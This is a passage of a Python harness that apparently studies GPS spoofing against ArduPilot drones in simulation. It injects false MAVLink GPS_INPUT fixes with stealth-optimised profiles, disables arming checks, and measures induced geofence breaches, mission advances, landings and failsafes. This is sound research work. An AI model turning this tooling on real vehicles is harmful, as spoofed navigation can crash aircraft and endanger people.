        improved = adaptive_changed and adaptive_min > 0 and adaptive_min < linear_final
        verdict["metrics"] = case_metrics
        if not baseline_changed and improved:
            verdict["verdict"] = "pass"
            verdict["reason"] = "adaptive payload found a lower-drift geofence breach than linear final drift"
        elif adaptive_changed and not baseline_changed:
            verdict["verdict"] = "fail"
            verdict["reason"] = "adaptive payload caused breach but did not improve over linear final drift"
        else:
            verdict["verdict"] = "fail"
            verdict["reason"] = "adaptive geofence decision change was not isolated from baseline"
        summary = {
            "classification": "adaptive geofence-deception payload" if verdict["verdict"] == "pass" else "not advanced beyond E6",
            "linear_final_drift_m": linear_final,
            "adaptive_minimum_breach_drift_m": adaptive_min,
            "verdict": verdict,
        }
        (bundle_dir / "mission_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, all_controller_rows)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        (bundle_dir / "mission_summary.json").write_text(json.dumps({"error": repr(exc)}, indent=2) + "\n", encoding="utf-8")
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def send_command_long(conn, command: int, params: list[float] | None = None) -> None:
    values = list(params or [])
    values.extend([0.0] * (7 - len(values)))
    conn.mav.command_long_send(
        conn.target_system,
        conn.target_component,
        command,
        0,
        *values[:7],
    )


def set_mode(conn, mode: str) -> bool:
    mapping = conn.mode_mapping()
    if not mapping or mode not in mapping:
        return False
    conn.mav.set_mode_send(
        conn.target_system,
        getattr(mavutil.mavlink, "MAV_MODE_FLAG_CUSTOM_MODE_ENABLED", 1),
        mapping[mode],
    )
    deadline = time.time() + 5.0
    while time.time() < deadline:
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=0.2)
        if msg is None:
            continue
        try:
            if mavutil.mode_string_v10(msg) == mode:
                return True
        except Exception:
            pass
    return False


def arm_vehicle(conn) -> bool:
    send_command_long(conn, getattr(mavutil.mavlink, "MAV_CMD_COMPONENT_ARM_DISARM", 400), [1.0])
    deadline = time.time() + 8.0
    armed_flag = getattr(mavutil.mavlink, "MAV_MODE_FLAG_SAFETY_ARMED", 128)
    while time.time() < deadline:
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=0.2)
        if msg is None:
            continue
        if getattr(msg, "base_mode", 0) & armed_flag:
            return True
    return False


def send_mission_item_int(conn, seq: int, command: int, current: int, lat: float, lon: float, alt: float) -> None:
    args = (
        conn.target_system,
        conn.target_component,
        seq,
        getattr(mavutil.mavlink, "MAV_FRAME_GLOBAL_RELATIVE_ALT_INT", 6),
        command,
        current,
        1,
        0.0,
        2.0,
        0.0,
        float("nan"),
        int(lat * 1e7),
        int(lon * 1e7),
        alt,
    )
    try:
        conn.mav.mission_item_int_send(*args, getattr(mavutil.mavlink, "MAV_MISSION_TYPE_MISSION", 0))
    except TypeError:
        conn.mav.mission_item_int_send(*args)


def mission_type() -> int:
    return getattr(mavutil.mavlink, "MAV_MISSION_TYPE_MISSION", 0)


def mission_clear_all(conn) -> None:
    try:
        conn.mav.mission_clear_all_send(conn.target_system, conn.target_component, mission_type())
    except TypeError:
        conn.mav.mission_clear_all_send(conn.target_system, conn.target_component)


def mission_count_send(conn, count: int) -> None:
    try:
        conn.mav.mission_count_send(conn.target_system, conn.target_component, count, mission_type())
    except TypeError:
        conn.mav.mission_count_send(conn.target_system, conn.target_component, count)


def mission_request_list(conn) -> None:
    try:
        conn.mav.mission_request_list_send(conn.target_system, conn.target_component, mission_type())
    except TypeError:
        conn.mav.mission_request_list_send(conn.target_system, conn.target_component)


def mission_request_item(conn, seq: int) -> None:
    try:
        conn.mav.mission_request_int_send(conn.target_system, conn.target_component, seq, mission_type())
    except TypeError:
        conn.mav.mission_request_int_send(conn.target_system, conn.target_component, seq)
    except AttributeError:
        try:
            conn.mav.mission_request_send(conn.target_system, conn.target_component, seq, mission_type())
        except TypeError:
            conn.mav.mission_request_send(conn.target_system, conn.target_component, seq)


def upload_single_waypoint_mission(conn, home_lat: float, home_lon: float, alt: float, bearing_deg: float = 0.0) -> bool:
    wp_lat, wp_lon = offset_latlon_m(home_lat, home_lon, 20.0 * math.cos(math.radians(bearing_deg)), 20.0 * math.sin(math.radians(bearing_deg)))
    try:
        mission_clear_all(conn)
        time.sleep(0.5)
        while conn.recv_match(type="MISSION_ACK", blocking=False) is not None:
            pass
        mission_count_send(conn, 2)
    except Exception:
        return False
    sent = set()
    deadline = time.time() + 10.0
    while time.time() < deadline:
        msg = conn.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT", "MISSION_ACK"], blocking=True, timeout=0.5)
        if msg is None:
            continue
        mtype = msg.get_type()
        if mtype == "MISSION_ACK":
            if sent == {0, 1}:
                return True
            continue
        seq = int(getattr(msg, "seq", 0))
        if seq == 0:
            send_mission_item_int(conn, 0, getattr(mavutil.mavlink, "MAV_CMD_NAV_TAKEOFF", 22), 1, home_lat, home_lon, 10.0)
            sent.add(0)
        elif seq == 1:
            send_mission_item_int(conn, 1, getattr(mavutil.mavlink, "MAV_CMD_NAV_WAYPOINT", 16), 0, wp_lat, wp_lon, 10.0)
            sent.add(1)
    return sent == {0, 1}


def run_auto_waypoint_case(
    config: RunnerConfig,
    bundle_dir: Path,
    case_name: str,
    profile: str | None,
    append_log: bool,
    experiment_name: str = "E9_auto_waypoint_reach",
) -> tuple[dict, list[dict], list[dict], list[dict], dict]:
    experiment = experiment_name
    connection = f"tcp:127.0.0.1:{config.port}"
    processes: list[ManagedProcess] = []
    conn = None
    injection_rows: list[dict] = []
    telemetry_rows: list[dict] = []
    decision_rows: list[dict] = []
    env_case: dict = {"case": case_name, "connection": connection}
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir, append_log=append_log)
        processes.append(sitl)
        env_case["sitl_launch_command"] = sitl_command
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(config.home)
        env_case["params_before"] = snapshot_params(conn, bundle_dir / f"params_before_{case_name}.txt")
        env_case["arming_check_disabled"] = set_param(conn, "ARMING_CHECK", 0)
        env_case["mission_uploaded"] = upload_single_waypoint_mission(conn, lat, lon, alt, bearing_deg=config.bearing_deg)
        if not env_case["mission_uploaded"]:
            raise RuntimeError("mission upload failed")
        env_case["guided_mode"] = set_mode(conn, "GUIDED")
        env_case["armed"] = arm_vehicle(conn)
        env_case["auto_mode"] = set_mode(conn, "AUTO")
        if not env_case["auto_mode"]:
            raise RuntimeError("AUTO mode failed")
        try:
            send_command_long(conn, getattr(mavutil.mavlink, "MAV_CMD_MISSION_START", 300), [0.0, 1.0])
        except Exception:
            pass
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(
            warmup_gps(conn, config, experiment, f"{case_name}_warmup", lat, lon, alt, "fc-direct-auto-waypoint", start, state)
        )
        if profile is None:
            sample = baseline_sample(lat, lon, alt, "fc-direct-auto-waypoint")
            end = time.time() + max(12.0, config.iterations * config.interval)
            while time.time() < end:
                send_gps_input(conn, sample, config)
                telemetry_rows.extend(
                    collect_telemetry(conn, experiment, case_name, 0, sample, lat, lon, start, max(config.interval, 0.15), state)
                )
        else:
            if profile == "adaptive":
                motion = AdaptiveMotionState()
                desired = 0.0
                steps = max(1, int(config.max_drift_m / 0.75))
                samples = []
                for _ in range(steps):
                    desired = min(config.max_drift_m, desired + 0.75)
                    samples.append(bounded_adaptive_sample(lat, lon, alt, config, motion, desired, "fc-direct-auto-waypoint"))
            else:
                samples = generate_sequence(lat, lon, alt, config, profile, "gps-input", "fc-direct-auto-waypoint")
            for sample in samples:
                injection_rows.append(injection_row(experiment, case_name, sample))
                send_gps_input(conn, sample, config)
                chunk = collect_telemetry(conn, experiment, case_name, sample.sample_index, sample, lat, lon, start, max(config.interval, 0.15), state)
                telemetry_rows.extend(chunk)
                event = first_decision_event(chunk, experiment, case_name, "mission_advance")
                if event:
                    decision_rows.append(event)
                    break
        telemetry_rows.extend(collect_telemetry(conn, experiment, f"{case_name}_settle", 0, None, lat, lon, start, 2.0, state))
        event = first_decision_event(telemetry_rows, experiment, case_name, "mission_advance")
        if event and not decision_rows:
            decision_rows.append(event)
        env_case["params_after"] = snapshot_params(conn, bundle_dir / f"params_after_{case_name}.txt")
        metrics = compute_reflection_metrics(telemetry_rows, injection_rows)
        metrics["decision_changed"] = bool(decision_rows)
        metrics["mission_advance_time_s"] = as_float(decision_rows[0].get("elapsed_s")) if decision_rows else 0.0
        return env_case, injection_rows, telemetry_rows, decision_rows, metrics
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_e9(config: RunnerConfig) -> Path:
    experiment = "E9_auto_waypoint_reach"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "fc-direct-gps-input-auto-waypoint", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "AUTO waypoint mission-current decision under GPS_INPUT",
        "verdict": "error",
        "reason": "E9 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        case_metrics = {}
        case_envs = []
        cases = [("baseline", None), ("linear", "linear"), ("ekf_smooth", "ekf-smooth"), ("adaptive", "adaptive")]
        for idx, (case_name, profile) in enumerate(cases):
            env_case, inj, telem, decisions, metrics = run_auto_waypoint_case(
                config, bundle_dir, case_name, profile, append_log=idx > 0
            )
            case_envs.append(env_case)
            case_metrics[case_name] = metrics
            all_injection_rows.extend(inj)
            all_telemetry_rows.extend(telem)
            all_decision_rows.extend(decisions)
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, [])
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        baseline_time = case_metrics.get("baseline", {}).get("mission_advance_time_s", 0.0)
        attack_times = {
            name: data.get("mission_advance_time_s", 0.0)
            for name, data in case_metrics.items()
            if name != "baseline" and data.get("decision_changed")
        }
        earlier = {
            name: t for name, t in attack_times.items()
            if baseline_time <= 0.0 or (t > 0.0 and t + 2.0 < baseline_time)
        }
        verdict["metrics"] = case_metrics
        if earlier:
            verdict["verdict"] = "pass"
            verdict["reason"] = f"GPS_INPUT caused earlier AUTO waypoint mission-current change: {earlier}"
        else:
            verdict["verdict"] = "fail"
            verdict["reason"] = "AUTO waypoint mission-current did not advance earlier under GPS_INPUT"
        summary = {
            "classification": "adaptive auto-waypoint mission-deception payload" if verdict["verdict"] == "pass" else "auto-waypoint impact not proven",
            "baseline_mission_advance_time_s": baseline_time,
            "attack_mission_advance_times_s": attack_times,
            "verdict": verdict,
        }
        (bundle_dir / "mission_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, [])
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        (bundle_dir / "mission_summary.json").write_text(json.dumps({"error": repr(exc)}, indent=2) + "\n", encoding="utf-8")
        verdict["verdict"] = "blocked"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def latest_bundle(out_root: Path, suffix: str) -> Path | None:
    candidates = sorted(out_root.glob(f"*_{suffix}"), key=lambda p: p.name, reverse=True)
    return candidates[0] if candidates else None


def run_e10(config: RunnerConfig) -> Path:
    experiment = "E10_summary"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "advanced-summary", "<summary>")
    (bundle_dir / "sitl.log").write_text("E10 summary does not launch SITL.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    refs = {
        "E7": latest_bundle(config.out_root, "E7_route_matrix"),
        "E8": latest_bundle(config.out_root, "E8_adaptive_geofence"),
        "E9": latest_bundle(config.out_root, "E9_auto_waypoint_reach"),
    }
    verdicts = {}
    for key, path in refs.items():
        if path and (path / "verdict.json").exists():
            verdicts[key] = {
                "bundle": str(path),
                "verdict": json.loads((path / "verdict.json").read_text(encoding="utf-8")),
            }
        else:
            verdicts[key] = {"bundle": None, "verdict": {"verdict": "missing", "reason": "no bundle found"}}
    e8_pass = verdicts["E8"]["verdict"].get("verdict") == "pass"
    e9_pass = verdicts["E9"]["verdict"].get("verdict") == "pass"
    if e8_pass and e9_pass:
        classification = "adaptive mission-deception payload"
        verdict_state = "pass"
    elif e8_pass:
        classification = "adaptive geofence-deception payload"
        verdict_state = "pass"
    elif e9_pass:
        classification = "adaptive auto-waypoint mission-deception payload"
        verdict_state = "pass"
    else:
        classification = "post-access navigation-deception payload"
        verdict_state = "fail"
    verdict = {
        "experiment": experiment,
        "claim_tested": "advanced B-path claim summary",
        "verdict": verdict_state,
        "reason": classification,
        "metrics": {"source_verdicts": verdicts},
        "not_claimed": NOT_CLAIMED,
    }
    summary = {
        "classification": classification,
        "source_bundles": {k: v["bundle"] for k, v in verdicts.items()},
        "verdict": verdict,
    }
    (bundle_dir / "mission_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    write_csv(bundle_dir / "route_matrix.csv", ROUTE_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, [])
    write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, [])
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def advanced_empty_files(bundle_dir: Path) -> None:
    write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, [])
    write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, [])
    write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, [])
    write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "best_attacks.csv", IMPACT_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "failed_targets.csv", IMPACT_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, [])
    write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, [])
    (bundle_dir / "attack_plan.json").write_text("{}\n", encoding="utf-8")
    (bundle_dir / "mission_summary.json").write_text("{}\n", encoding="utf-8")


def decision_row_from_event(event, experiment: str, case_name: str, telemetry_rows: list[dict] | None = None) -> dict:
    row = event_to_row(event, experiment, case_name)
    row["timestamp"] = utc_now()
    if telemetry_rows and (
        as_float(row.get("official_drift_m")) <= 0.0
        or as_float(row.get("target_drift_m")) <= 0.0
    ):
        latest = latest_global_row(telemetry_rows)
        if latest:
            row["sample_index"] = latest.get("sample_index", row.get("sample_index", ""))
            row["target_drift_m"] = latest.get("target_drift_m", row.get("target_drift_m", ""))
            row["official_drift_m"] = latest.get("official_drift_m", row.get("official_drift_m", ""))
    return row


def configure_objective(conn, objective: str) -> dict[str, bool | str]:
    result: dict[str, bool | str] = {}
    if objective in ("geofence", "rtl"):
        result.update(configure_geofence(conn))
        result["objective_action"] = "fence breach; rtl detector also watches HEARTBEAT mode"
    elif objective == "land":
        requested = {
            "FENCE_ENABLE": 1,
            "FENCE_TYPE": 3,
            "FENCE_ACTION": 4,
            "FENCE_RADIUS": 8,
            "FENCE_MARGIN": 1,
        }
        result.update({name: set_param(conn, name, value) for name, value in requested.items()})
        result["objective_action"] = "land detector watches LAND mode/status after bounded GPS_INPUT"
    elif objective == "failsafe":
        result["objective_action"] = "attack phase sends degraded GPS_INPUT fix data"
    else:
        result["objective_action"] = "no special objective parameter setup"
    return result


def make_profile_samples(
    base_lat: float,
    base_lon: float,
    base_alt: float,
    config: RunnerConfig,
    profile: str,
    route: str,
) -> list[InjectionSample]:
    if profile == "adaptive":
        state = AdaptiveMotionState()
        desired = 0.0
        samples: list[InjectionSample] = []
        for _ in range(max(1, int(config.max_drift_m / max(config.step_m, 0.5)))):
            desired = min(config.max_drift_m, desired + max(0.5, config.step_m))
            samples.append(
                bounded_adaptive_sample(
                    base_lat, base_lon, base_alt, config, state, desired, route, "adaptive"
                )
            )
        return samples
    if profile == "stealth-opt":
        return generate_sequence(base_lat, base_lon, base_alt, config, "stealth-opt", "gps-input", route)
    return generate_sequence(base_lat, base_lon, base_alt, config, profile, "gps-input", route)


def run_decision_route_case(
    config: RunnerConfig,
    bundle_dir: Path,
    experiment: str,
    objective: str,
    case_name: str,
    profile: str | None,
    route_key: str,
    append_log: bool,
) -> tuple[dict, list[dict], list[dict], list[dict], dict]:
    connection, use_mavproxy, route = route_connection(route_key, config)
    processes: list[ManagedProcess] = []
    conn = None
    injection_rows: list[dict] = []
    telemetry_rows: list[dict] = []
    decision_rows: list[dict] = []
    env_case: dict = {
        "case": case_name,
        "objective": objective,
        "profile": profile or "baseline",
        "route": route_key,
        "route_claim": route_claim(route_key),
        "connection": connection,
    }
    case_config = config
    if objective == "failsafe" and profile is not None:
        case_config = replace(config, fix_type=0, satellites=0, hacc=max(config.hacc, 25.0), vacc=max(config.vacc, 25.0))
    try:
        sitl, sitl_command = start_sitl(case_config, bundle_dir, append_log=append_log)
        processes.append(sitl)
        env_case["sitl_launch_command"] = sitl_command
        if use_mavproxy:
            mavproxy, mavproxy_command, mavproxy_error = start_mavproxy(case_config, bundle_dir)
            env_case["mavproxy_command"] = mavproxy_command
            env_case["mavproxy_error"] = mavproxy_error
            if mavproxy_error:
                metrics = {
                    "verdict": "blocked",
                    "reason": mavproxy_error,
                    "decision_changed": False,
                    "route": route_key,
                    "profile": profile or "baseline",
                }
                return env_case, injection_rows, telemetry_rows, decision_rows, metrics
            if mavproxy is not None:
                processes.append(mavproxy)
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(case_config.home)
        env_case["params_before"] = snapshot_params(
            conn, bundle_dir / f"params_before_{experiment}_{case_name}.txt"
        )
        env_case["objective_set_results"] = configure_objective(conn, objective)
        if objective in ("rtl", "land"):
            env_case["arming_check_disabled"] = set_param(conn, "ARMING_CHECK", 0)
            env_case["guided_mode"] = set_mode(conn, "GUIDED")
            env_case["armed"] = arm_vehicle(conn)
            try:
                send_command_long(conn, getattr(mavutil.mavlink, "MAV_CMD_NAV_TAKEOFF", 22), [10.0])
                env_case["takeoff_command_sent"] = True
            except Exception:
                env_case["takeoff_command_sent"] = False
            time.sleep(2.0)
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(
            warmup_gps(conn, case_config, experiment, f"{case_name}_warmup", lat, lon, alt, route, start, state)
        )
        event = None
        if profile is None:
            sample = baseline_sample(lat, lon, alt, route)
            end = time.time() + max(8.0, case_config.iterations * case_config.interval)
            while time.time() < end:
                send_gps_input(conn, sample, case_config)
                chunk = collect_telemetry(
                    conn, experiment, case_name, 0, sample, lat, lon, start, max(case_config.interval, 0.15), state
                )
                telemetry_rows.extend(chunk)
                event = detect_event(chunk, objective)
                if event:
                    decision_rows.append(decision_row_from_event(event, experiment, case_name, telemetry_rows))
                    break
        else:
            samples = make_profile_samples(lat, lon, alt, case_config, profile, route)
            for sample in samples:
                injection_rows.append(injection_row(experiment, case_name, sample))
                send_gps_input(conn, sample, case_config)
                chunk = collect_telemetry(
                    conn,
                    experiment,
                    case_name,
                    sample.sample_index,
                    sample,
                    lat,
                    lon,
                    start,
                    max(case_config.interval, 0.15),
                    state,
                )
                telemetry_rows.extend(chunk)
                event = detect_event(chunk, objective)
                if event and objective in ("geofence", "auto-waypoint", "land", "failsafe"):
                    decision_rows.append(decision_row_from_event(event, experiment, case_name, telemetry_rows))
                    break
                if event and objective == "rtl":
                    decision_rows.append(decision_row_from_event(event, experiment, case_name, telemetry_rows))
                    break
        telemetry_rows.extend(
            collect_telemetry(conn, experiment, f"{case_name}_settle", 0, None, lat, lon, start, 3.0, state)
        )
        if not decision_rows:
            event = detect_event(telemetry_rows, objective)
            if event:
                decision_rows.append(decision_row_from_event(event, experiment, case_name, telemetry_rows))
        env_case["params_after"] = snapshot_params(
            conn, bundle_dir / f"params_after_{experiment}_{case_name}.txt"
        )
        metrics = compute_reflection_metrics(telemetry_rows, injection_rows)
        metrics.update(stealth_score(metrics, case_config.stealth_budget))
        metrics["decision_changed"] = bool(decision_rows)
        metrics["route"] = route_key
        metrics["profile"] = profile or "baseline"
        metrics["objective"] = objective
        if decision_rows:
            metrics["decision_change_time_s"] = as_float(decision_rows[0].get("elapsed_s"))
            metrics["drift_at_decision_m"] = as_float(decision_rows[0].get("official_drift_m"))
        return env_case, injection_rows, telemetry_rows, decision_rows, metrics
    except Exception as exc:
        metrics = {
            "verdict": "blocked",
            "reason": repr(exc),
            "decision_changed": False,
            "route": route_key,
            "profile": profile or "baseline",
            "objective": objective,
        }
        return env_case, injection_rows, telemetry_rows, decision_rows, metrics
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_auto_waypoint_objective(
    config: RunnerConfig,
    bundle_dir: Path,
    experiment: str,
    append_start: bool,
) -> tuple[list[dict], list[dict], list[dict], list[dict], list[dict]]:
    envs: list[dict] = []
    injections: list[dict] = []
    telemetry: list[dict] = []
    decisions: list[dict] = []
    matrix: list[dict] = []
    case_metrics: dict[str, dict] = {}
    for idx, (case_name, profile) in enumerate((("baseline", None), ("stealth_opt", "stealth-opt"))):
        env_case, inj, telem, decision_rows, metrics = run_auto_waypoint_case(
            config,
            bundle_dir,
            case_name,
            profile,
            append_log=append_start or idx > 0,
            experiment_name=experiment,
        )
        metrics.update(stealth_score(metrics, config.stealth_budget))
        metrics["route"] = "fc-direct"
        metrics["profile"] = profile or "baseline"
        metrics["objective"] = "auto-waypoint"
        envs.append(env_case)
        injections.extend(inj)
        telemetry.extend(telem)
        decisions.extend(decision_rows)
        case_metrics[case_name] = metrics
    baseline_time = case_metrics.get("baseline", {}).get("mission_advance_time_s", 0.0)
    attack_time = case_metrics.get("stealth_opt", {}).get("mission_advance_time_s", 0.0)
    attack_changed = attack_time > 0.0 and (baseline_time <= 0.0 or attack_time + 2.0 < baseline_time)
    for case_name, metrics in case_metrics.items():
        event = None
        if case_name == "stealth_opt" and attack_changed:
            event = detect_event(telemetry, "auto-waypoint", baseline_time_s=baseline_time)
        verdict = "pass" if case_name == "stealth_opt" and attack_changed else "fail"
        reason = "earlier MISSION_CURRENT advance" if verdict == "pass" else "no earlier mission advance"
        matrix.append(matrix_row("auto-waypoint", case_name, verdict, reason, metrics, event))
    return envs, injections, telemetry, decisions, matrix


def run_e11(config: RunnerConfig) -> Path:
    experiment = "E11_mission_decision_matrix"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "mission-decision-matrix", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    matrix_rows: list[dict] = []
    case_envs: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "mission-decision impact matrix across position-dependent decisions",
        "verdict": "error",
        "reason": "E11 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        full_iterations = max(config.iterations, math.ceil(config.max_drift_m / max(config.step_m, 0.1)))
        objective_config = replace(config, profile="stealth-opt", iterations=full_iterations)
        append = False
        for objective in OBJECTIVES:
            if objective == "auto-waypoint":
                envs, inj, telem, decisions, rows = run_auto_waypoint_objective(
                    objective_config, bundle_dir, experiment, append_start=append
                )
                append = True
                case_envs.extend(envs)
                all_injection_rows.extend(inj)
                all_telemetry_rows.extend(telem)
                all_decision_rows.extend(decisions)
                matrix_rows.extend(rows)
                continue
            baseline_env, baseline_inj, baseline_telem, baseline_decisions, baseline_metrics = run_decision_route_case(
                objective_config, bundle_dir, experiment, objective, f"{objective}_baseline", None, "fc-direct", append
            )
            append = True
            attack_env, attack_inj, attack_telem, attack_decisions, attack_metrics = run_decision_route_case(
                objective_config, bundle_dir, experiment, objective, f"{objective}_stealth_opt", "stealth-opt", "fc-direct", True
            )
            case_envs.extend([baseline_env, attack_env])
            all_injection_rows.extend(baseline_inj + attack_inj)
            all_telemetry_rows.extend(baseline_telem + attack_telem)
            all_decision_rows.extend(baseline_decisions + attack_decisions)
            baseline_event = detect_event(baseline_telem, objective)
            attack_event = detect_event(attack_telem, objective)
            baseline_pass = baseline_event is None
            attack_pass = attack_event is not None and baseline_event is None
            matrix_rows.append(
                matrix_row(
                    objective,
                    "baseline",
                    "pass" if baseline_pass else "fail",
                    "baseline did not trigger decision" if baseline_pass else "baseline triggered decision",
                    baseline_metrics,
                    baseline_event,
                )
            )
            matrix_rows.append(
                matrix_row(
                    objective,
                    "stealth_opt",
                    "pass" if attack_pass else "fail",
                    "attack changed decision while baseline did not" if attack_pass else "no isolated decision change",
                    attack_metrics,
                    attack_event,
                )
            )
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, matrix_rows)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, [])
        write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, [])
        write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, [])
        write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, [])
        (bundle_dir / "attack_plan.json").write_text("{}\n", encoding="utf-8")
        geofence_success = any(r["objective"] == "geofence" and r["case"] != "baseline" and r["verdict"] == "pass" for r in matrix_rows)
        other_success = [r for r in matrix_rows if r["objective"] != "geofence" and r["case"] != "baseline" and r["verdict"] == "pass"]
        verdict["metrics"] = {
            "objectives": len(OBJECTIVES),
            "geofence_success": geofence_success,
            "non_geofence_success_count": len(other_success),
            "matrix_rows": matrix_rows,
        }
        if geofence_success and other_success:
            verdict["verdict"] = "pass"
            verdict["reason"] = "mission-impact matrix found geofence plus non-geofence decision impact"
        elif geofence_success:
            verdict["verdict"] = "fail"
            verdict["reason"] = "matrix generated, but impact remains geofence-only"
        else:
            verdict["verdict"] = "fail"
            verdict["reason"] = "matrix generated, but no isolated geofence decision impact was reproduced"
        (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        advanced_empty_files(bundle_dir)
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def stealth_metric_row(objective: str, route: str, profile: str, metrics: dict, verdict_state: str, reason: str, bundle: str = "") -> dict:
    return {
        "objective": objective,
        "profile": profile,
        "route": route,
        "decision_changed": int(bool(metrics.get("decision_changed"))),
        "stealth_budget": metrics.get("stealth_budget", ""),
        "stealth_score": metrics.get("stealth_score", 0.0),
        "constraint_violations": metrics.get("constraint_violations", 0),
        "final_target_drift_m": metrics.get("final_target_drift_m", 0.0),
        "final_official_drift_m": metrics.get("final_official_drift_m", 0.0),
        "mean_target_error_m": metrics.get("mean_target_error_m", 0.0),
        "commanded_speed_max_mps": metrics.get("commanded_speed_max_mps", 0.0),
        "commanded_accel_max_mps2": metrics.get("commanded_accel_max_mps2", 0.0),
        "abrupt_jump_count": metrics.get("abrupt_jump_count", 0),
        "gps_fix_stability": metrics.get("gps_fix_stability", 0.0),
        "verdict": verdict_state,
        "reason": reason,
        "bundle": bundle,
    }


def run_e12(config: RunnerConfig) -> Path:
